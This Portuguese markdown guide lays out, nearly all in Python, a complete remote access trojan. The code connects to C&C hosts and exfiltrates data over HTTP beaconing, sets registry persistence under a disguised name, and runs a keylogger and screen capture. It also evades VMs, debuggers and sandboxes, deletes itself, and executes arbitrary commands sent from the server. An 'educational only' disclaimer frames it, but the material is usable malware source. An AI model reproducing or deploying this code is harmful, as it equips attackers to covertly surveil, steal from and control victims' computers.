# Reverse Shell - Exemplos de Código Avançado

> ⚠️ **PARA FINS EDUCACIONAIS APENAS** - Use responsavelmente em ambientes autorizados

## 🔒 1. Evasão e Stealth

### Múltiplos Servidores Failover
```python
import socket
import random
from time import sleep

# Lista de servidores C&C
SERVERS = [
    ('192.168.1.78', 443),
    ('10.0.0.1', 8080), 
    ('backup.example.com', 4444),
    ('c2.domain.com', 80)
]

def connect_with_failover():
    """Tenta conectar em múltiplos servidores"""
    for server_ip, server_port in SERVERS:
        try:
            print(f"[+] Tentando conectar em {server_ip}:{server_port}")
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(10)  # Timeout de 10 segundos
            c.connect((server_ip, server_port))
            print(f"[+] Conectado com sucesso em {server_ip}:{server_port}")
            return c
        except Exception as e:
            print(f"[-] Falha ao conectar em {server_ip}:{server_port} - {e}")
            sleep(random.randint(2, 5))  # Delay aleatório
    return None
```

### Delay Aleatório e User-Agent Spoofing
```python
import random
import time
import requests

def random_delay():
    """Delay aleatório para evitar detecção"""
    delay = random.randint(30, 300)  # 30 segundos a 5 minutos
    print(f"[*] Aguardando {delay} segundos...")
    time.sleep(delay)

def http_beacon(url, data):
    """Comunicação HTTP com User-Agent falso"""
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/91.0.4472.124'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    
    try:
        response = requests.post(url, data={'cmd': data}, headers=headers, timeout=10)
        return response.text
    except Exception as e:
        print(f"[-] Erro HTTP: {e}")
        return None
```

## 🌐 2. Persistência

### Auto-start no Windows Registry
```python
import winreg
import sys
import os

def add_to_startup_registry():
    """Adiciona o malware ao startup do Windows"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        # Nome da entrada (camuflado)
        entry_name = "WindowsSecurityUpdate"
        executable_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        
        winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        print("[+] Persistência configurada no Registry")
        
    except Exception as e:
        print(f"[-] Erro ao configurar persistência: {e}")

def remove_from_startup():
    """Remove do startup (para limpeza)"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, "WindowsSecurityUpdate")
        winreg.CloseKey(key)
        print("[+] Persistência removida")
    except:
        pass
```

### Verificação de Instância Única
```python
import psutil
import os
import sys

def is_already_running():
    """Verifica se o malware já está executando"""
    current_pid = os.getpid()
    current_name = os.path.basename(sys.argv[0])
    
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if (proc.info['pid'] != current_pid and 
                proc.info['name'] == current_name):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def create_mutex():
    """Cria um mutex simples usando arquivo"""
    mutex_file = os.path.join(os.environ.get('TEMP', '/tmp'), '.system_update_lock')
    try:
        if os.path.exists(mutex_file):
            return False  # Já está rodando
        with open(mutex_file, 'w') as f:
            f.write(str(os.getpid()))
        return True
    except:
        return False
```

## 📡 3. Comunicação Avançada

### Criptografia AES
```python
from cryptography.fernet import Fernet
import base64
import hashlib

class CryptoComm:
    def __init__(self, password="default_password"):
        # Gerar chave a partir de senha
        key = hashlib.sha256(password.encode()).hexdigest()[:32]
        self.key = base64.urlsafe_b64encode(key.encode())
        self.cipher = Fernet(self.key)
    
    def encrypt(self, data):
        """Criptografa dados"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt(self, data):
        """Descriptografa dados"""
        return self.cipher.decrypt(data)

# Exemplo de uso
crypto = CryptoComm("my_secret_password")

def send_encrypted(socket, data):
    """Envia dados criptografados"""
    encrypted = crypto.encrypt(data)
    socket.send(encrypted)

def recv_encrypted(socket):
    """Recebe dados criptografados"""
    encrypted_data = socket.recv(1024)
    return crypto.decrypt(encrypted_data).decode()
```

### HTTP(S) Tunneling
```python
import requests
import json
import base64

class HTTPTunnel:
    def __init__(self, base_url, session_id=None):
        self.base_url = base_url.rstrip('/')
        self.session_id = session_id or self._generate_session_id()
        self.session = requests.Session()
        
    def _generate_session_id(self):
        import uuid
        return str(uuid.uuid4())
    
    def send_command_result(self, command, result):
        """Envia resultado de comando via HTTP POST"""
        data = {
            'session': self.session_id,
            'command': command,
            'result': base64.b64encode(result.encode()).decode(),
            'timestamp': time.time()
        }
        
        try:
            response = self.session.post(
                f"{self.base_url}/api/results",
                json=data,
                timeout=30
            )
            return response.status_code == 200
        except:
            return False
    
    def get_commands(self):
        """Busca comandos para executar"""
        try:
            response = self.session.get(
                f"{self.base_url}/api/commands/{self.session_id}",
                timeout=30
            )
            if response.status_code == 200:
                return response.json().get('commands', [])
        except:
            pass
        return []

# Exemplo de uso do túnel HTTP
tunnel = HTTPTunnel("https://c2-server.com")

def http_reverse_shell():
    while True:
        commands = tunnel.get_commands()
        for cmd in commands:
            result = execute_command(cmd)
            tunnel.send_command_result(cmd, result)
        time.sleep(30)  # Polling a cada 30 segundos
```

## 🎯 4. Funcionalidades Extras

### Screenshots
```python
import pyautogui
import io
import base64
from PIL import Image

def take_screenshot():
    """Captura screenshot da tela"""
    try:
        screenshot = pyautogui.screenshot()
        
        # Converter para bytes
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='PNG')
        img_bytes = img_buffer.getvalue()
        
        # Encode em base64 para transmissão
        img_b64 = base64.b64encode(img_bytes).decode()
        return img_b64
        
    except Exception as e:
        return f"Erro ao capturar screenshot: {e}"

def save_screenshot_to_file(filename="screenshot.png"):
    """Salva screenshot em arquivo"""
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        return f"Screenshot salvo como {filename}"
    except Exception as e:
        return f"Erro: {e}"
```

### Keylogger
```python
from pynput import keyboard
import threading
import time

class KeyLogger:
    def __init__(self):
        self.keys = []
        self.is_logging = False
        
    def on_key_press(self, key):
        """Callback para tecla pressionada"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.keys.append(key.char)
            else:
                # Teclas especiais
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.ctrl_l: '[CTRL]',
                    keyboard.Key.ctrl_r: '[CTRL]',
                    keyboard.Key.alt_l: '[ALT]',
                    keyboard.Key.alt_r: '[ALT]',
                    keyboard.Key.shift: '[SHIFT]'
                }
                self.keys.append(special_keys.get(key, f'[{key}]'))
                
        except Exception as e:
            pass
    
    def start_logging(self):
        """Inicia o keylogger"""
        self.is_logging = True
        
        def log_loop():
            with keyboard.Listener(on_press=self.on_key_press) as listener:
                listener.join()
        
        log_thread = threading.Thread(target=log_loop)
        log_thread.daemon = True
        log_thread.start()
    
    def get_logs(self):
        """Retorna e limpa os logs"""
        logs = ''.join(self.keys)
        self.keys = []
        return logs

# Uso do keylogger
keylogger = KeyLogger()
keylogger.start_logging()

def get_keystrokes():
    """Comando para obter teclas digitadas"""
    return keylogger.get_logs()
```

### Upload/Download de Arquivos
```python
import os
import base64

def upload_file(filepath):
    """Upload de arquivo do alvo"""
    try:
        if not os.path.exists(filepath):
            return f"Arquivo não encontrado: {filepath}"
        
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        # Encode em base64
        encoded_data = base64.b64encode(file_data).decode()
        
        return {
            'filename': os.path.basename(filepath),
            'size': len(file_data),
            'data': encoded_data
        }
        
    except Exception as e:
        return f"Erro no upload: {e}"

def download_file(filename, base64_data):
    """Download de arquivo para o alvo"""
    try:
        # Decode base64
        file_data = base64.b64decode(base64_data)
        
        with open(filename, 'wb') as f:
            f.write(file_data)
        
        return f"Arquivo {filename} baixado com sucesso ({len(file_data)} bytes)"
        
    except Exception as e:
        return f"Erro no download: {e}"

def list_files(directory="."):
    """Lista arquivos em diretório"""
    try:
        files = []
        for item in os.listdir(directory):
            item_path = os.path.join(directory, item)
            if os.path.isfile(item_path):
                size = os.path.getsize(item_path)
                files.append(f"FILE: {item} ({size} bytes)")
            else:
                files.append(f"DIR:  {item}/")
        
        return '\n'.join(files)
        
    except Exception as e:
        return f"Erro ao listar arquivos: {e}"
```

## 🛡️ 5. Anti-Debug/VM Detection

### Detectar Máquinas Virtuais
```python
import wmi
import subprocess
import os

def check_vm_artifacts():
    """Verifica artefatos de máquinas virtuais"""
    vm_indicators = {
        'processes': ['vmwareuser.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe'],
        'services': ['vmware', 'vbox', 'virtualbox', 'vmtools'],
        'registry': [
            r'HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools',
            r'HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions'
        ],
        'files': [
            r'C:\Program Files\VMware\VMware Tools',
            r'C:\Program Files\Oracle\VirtualBox Guest Additions'
        ]
    }
    
    # Verificar processos
    try:
        output = subprocess.check_output('tasklist', shell=True).decode()
        for process in vm_indicators['processes']:
            if process.lower() in output.lower():
                return True, f"Processo VM detectado: {process}"
    except:
        pass
    
    # Verificar arquivos
    for file_path in vm_indicators['files']:
        if os.path.exists(file_path):
            return True, f"Arquivo VM detectado: {file_path}"
    
    # Verificar WMI (Windows)
    try:
        c = wmi.WMI()
        for system in c.Win32_ComputerSystem():
            if any(vm in system.Model.lower() for vm in ['vmware', 'virtualbox', 'virtual', 'qemu']):
                return True, f"VM detectada via WMI: {system.Model}"
    except:
        pass
    
    return False, "Nenhuma VM detectada"

def check_debugger():
    """Verifica se está sendo debugado"""
    import sys
    
    # Verificar se debugger está anexado
    if sys.gettrace() is not None:
        return True, "Debugger detectado via sys.gettrace()"
    
    # Verificar timing (técnica básica)
    import time
    start = time.time()
    time.sleep(0.1)
    end = time.time()
    
    if (end - start) > 0.2:  # Muito lento, possível debug
        return True, "Execução muito lenta, possível debugging"
    
    return False, "Nenhum debugger detectado"
```

### Sandbox Evasion
```python
import psutil
import time
import random

def sandbox_evasion():
    """Técnicas básicas de evasão de sandbox"""
    
    # 1. Verificar recursos do sistema
    try:
        memory = psutil.virtual_memory().total / (1024**3)  # GB
        if memory < 2:  # Menos de 2GB pode indicar sandbox
            return True, "Memória RAM insuficiente (possível sandbox)"
    except:
        pass
    
    # 2. Verificar número de cores
    try:
        cores = psutil.cpu_count()
        if cores < 2:
            return True, "Poucos cores de CPU (possível sandbox)"
    except:
        pass
    
    # 3. Sleep e verificar tempo real
    expected_sleep = 3
    start_time = time.time()
    time.sleep(expected_sleep)
    actual_sleep = time.time() - start_time
    
    if actual_sleep < (expected_sleep * 0.8):  # Sleep acelerado
        return True, "Sleep acelerado detectado (sandbox)"
    
    # 4. Verificar interação do usuário (mouse)
    try:
        import win32gui
        initial_pos = win32gui.GetCursorPos()
        time.sleep(2)
        final_pos = win32gui.GetCursorPos()
        
        if initial_pos == final_pos:  # Mouse não se moveu
            return True, "Nenhuma atividade do mouse (possível sandbox)"
    except:
        pass
    
    return False, "Ambiente parece legítimo"

def advanced_sleep():
    """Sleep avançado com verificações"""
    # Sleep aleatório longo para confundir análise automatizada
    sleep_time = random.randint(180, 600)  # 3-10 minutos
    
    print(f"[*] Aguardando {sleep_time} segundos...")
    
    # Sleep dividido em pequenos intervalos
    for i in range(sleep_time):
        time.sleep(1)
        if i % 60 == 0:  # Verificar a cada minuto
            is_sandbox, reason = sandbox_evasion()
            if is_sandbox:
                print(f"[-] Sandbox detectada: {reason}")
                exit(1)
```

## 📱 6. Cross-Platform e System Info

### Detecção de Sistema Operacional
```python
import platform
import socket
import getpass
import subprocess

def get_system_info():
    """Coleta informações detalhadas do sistema"""
    info = {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'os_release': platform.release(),
        'architecture': platform.machine(),
        'processor': platform.processor(),
        'python_version': platform.python_version(),
    }
    
    # Informações específicas por SO
    if info['os'] == 'Windows':
        try:
            import wmi
            c = wmi.WMI()
            for os_info in c.Win32_OperatingSystem():
                info['os_name'] = os_info.Name.split('|')[0]
                info['total_memory'] = f"{int(os_info.TotalVisibleMemorySize) / 1024 / 1024:.2f} GB"
        except:
            pass
            
        # Informações de rede Windows
        try:
            output = subprocess.check_output('ipconfig', shell=True).decode()
            info['network_config'] = output
        except:
            pass
    
    elif info['os'] == 'Linux':
        # Distribuição Linux
        try:
            with open('/etc/os-release', 'r') as f:
                for line in f:
                    if line.startswith('PRETTY_NAME'):
                        info['distro'] = line.split('=')[1].strip().strip('"')
        except:
            pass
        
        # Informações de rede Linux
        try:
            output = subprocess.check_output(['ifconfig'], stderr=subprocess.DEVNULL)
            info['network_config'] = output.decode()
        except:
            pass
    
    return info

def format_system_info():
    """Formata informações do sistema para envio"""
    info = get_system_info()
    
    formatted = f"""
=== SYSTEM INFORMATION ===
Hostname: {info.get('hostname', 'Unknown')}
Username: {info.get('username', 'Unknown')}
Operating System: {info.get('os', 'Unknown')} {info.get('os_version', '')}
Architecture: {info.get('architecture', 'Unknown')}
Processor: {info.get('processor', 'Unknown')}
Python Version: {info.get('python_version', 'Unknown')}

=== ADDITIONAL INFO ===
"""
    
    if 'distro' in info:
        formatted += f"Linux Distribution: {info['distro']}\n"
    if 'os_name' in info:
        formatted += f"Windows Edition: {info['os_name']}\n"
    if 'total_memory' in info:
        formatted += f"Total Memory: {info['total_memory']}\n"
    
    return formatted
```

## 🔧 7. Reverse Shell Avançado - Integração Completa

### Classe Principal com Todas as Funcionalidades
```python
import socket
import subprocess
import os
import threading
import time
import random
from datetime import datetime

class AdvancedReverseShell:
    def __init__(self, servers, crypto_key="default_key"):
        self.servers = servers
        self.connection = None
        self.crypto = CryptoComm(crypto_key) if 'CryptoComm' in globals() else None
        self.keylogger = KeyLogger() if 'KeyLogger' in globals() else None
        self.session_id = self._generate_session_id()
        
    def _generate_session_id(self):
        import uuid
        return str(uuid.uuid4())[:8]
    
    def connect_with_features(self):
        """Conecta com todas as verificações de segurança"""
        
        # 1. Verificação de VM/Sandbox
        is_vm, vm_reason = check_vm_artifacts()
        if is_vm:
            print(f"[-] VM/Sandbox detectada: {vm_reason}")
            self._self_destruct()
            return False
        
        # 2. Verificação de debugger
        is_debug, debug_reason = check_debugger()
        if is_debug:
            print(f"[-] Debugger detectado: {debug_reason}")
            self._self_destruct()
            return False
        
        # 3. Verificação de instância única
        if is_already_running():
            print("[-] Instância já está executando")
            return False
        
        # 4. Sleep avançado para evasão
        if random.choice([True, False]):  # 50% chance
            advanced_sleep()
        
        # 5. Configurar persistência
        if platform.system() == 'Windows':
            add_to_startup_registry()
        
        # 6. Iniciar keylogger
        if self.keylogger:
            self.keylogger.start_logging()
        
        # 7. Conectar aos servidores
        return self._connect_to_servers()
    
    def _connect_to_servers(self):
        """Tenta conectar aos servidores C&C"""
        for server_ip, server_port in self.servers:
            try:
                random_delay()  # Delay aleatório
                
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.settimeout(30)
                self.connection.connect((server_ip, server_port))
                
                # Enviar informações iniciais
                init_data = f"[NEW SESSION] {self.session_id}\n"
                init_data += format_system_info()
                
                if self.crypto:
                    self.connection.send(self.crypto.encrypt(init_data))
                else:
                    self.connection.send(init_data.encode())
                
                return True
                
            except Exception as e:
                print(f"[-] Erro conectando a {server_ip}:{server_port} - {e}")
                continue
        
        return False
    
    def handle_commands(self):
        """Loop principal de comando"""
        while True:
            try:
                # Receber comando
                data = self.connection.recv(4096)
                if not data:
                    break
                
                if self.crypto:
                    command = self.crypto.decrypt(data).decode().strip()
                else:
                    command = data.decode().strip()
                
                if command == '/exit':
                    break
                
                # Executar comando
                result = self._execute_command(command)
                
                # Enviar resultado
                if self.crypto:
                    self.connection.send(self.crypto.encrypt(result))
                else:
                    self.connection.send(result.encode())
                    
            except Exception as e:
                print(f"[-] Erro no loop de comando: {e}")
                break
        
        self.connection.close()
    
    def _execute_command(self, command):
        """Executa comandos especiais e do sistema"""
        
        # Comandos especiais
        if command == '/sysinfo':
            return format_system_info()
        
        elif command == '/screenshot':
            return take_screenshot() if 'take_screenshot' in globals() else "Screenshot não disponível"
        
        elif command == '/keylog':
            if self.keylogger:
                return self.keylogger.get_logs() or "Nenhuma tecla capturada"
            return "Keylogger não disponível"
        
        elif command.startswith('/upload '):
            filepath = command[8:].strip()
            return str(upload_file(filepath)) if 'upload_file' in globals() else "Upload não disponível"
        
        elif command.startswith('/download '):
            parts = command[10:].split(' ', 1)
            if len(parts) == 2:
                filename, data = parts
                return download_file(filename, data) if 'download_file' in globals() else "Download não disponível"
            return "Formato: /download <filename> <base64_data>"
        
        elif command.startswith('/ls'):
            directory = command[3:].strip() or "."
            return list_files(directory) if 'list_files' in globals() else "Lista não disponível"
        
        elif command.startswith('cd '):
            try:
                os.chdir(command[3:].strip())
                return f"Diretório alterado para: {os.getcwd()}"
            except Exception as e:
                return f"Erro ao alterar diretório: {e}"
        
        # Comandos normais do sistema
        else:
            try:
                result = subprocess.run(
                    command, 
                    shell=True, 
                    capture_output=True, 
                    text=True, 
                    timeout=60
                )
                output = result.stdout + result.stderr
                return output or f"Comando executado (código: {result.returncode})"
                
            except subprocess.TimeoutExpired:
                return "Erro: Comando expirou (timeout 60s)"
            except Exception as e:
                return f"Erro ao executar comando: {e}"
    
    def _self_destruct(self):
        """Auto-destruição em caso de detecção"""
        try:
            # Remover persistência
            if platform.system() == 'Windows':
                remove_from_startup()
            
            # Remover arquivos
            if os.path.exists(__file__):
                os.remove(__file__)
        except:
            pass
        
        exit(1)

# Exemplo de uso completo
if __name__ == "__main__":
    servers = [
        ('192.168.1.78', 443),
        ('backup.domain.com', 8080)
    ]
    
    shell = AdvancedReverseShell(servers, "my_encryption_key")
    
    if shell.connect_with_features():
        print("[+] Conectado ao servidor C&C")
        shell.handle_commands()
    else:
        print("[-] Falha ao conectar")
```

---

## ⚠️ DISCLAIMER LEGAL

**ESTE CÓDIGO É FORNECIDO EXCLUSIVAMENTE PARA FINS EDUCACIONAIS**

- ✅ Use em laboratórios próprios
- ✅ Teste em máquinas virtuais autorizadas  
- ✅ Pesquisa acadêmica em segurança
- ✅ Red team em ambiente corporativo autorizado

**QUALQUER USO MALICIOSO É ESTRITAMENTE PROIBIDO**

O desenvolvedor não se responsabiliza pelo uso inadequado deste código.

---

*Desenvolvido para fins educacionais - Cybersecurity Research*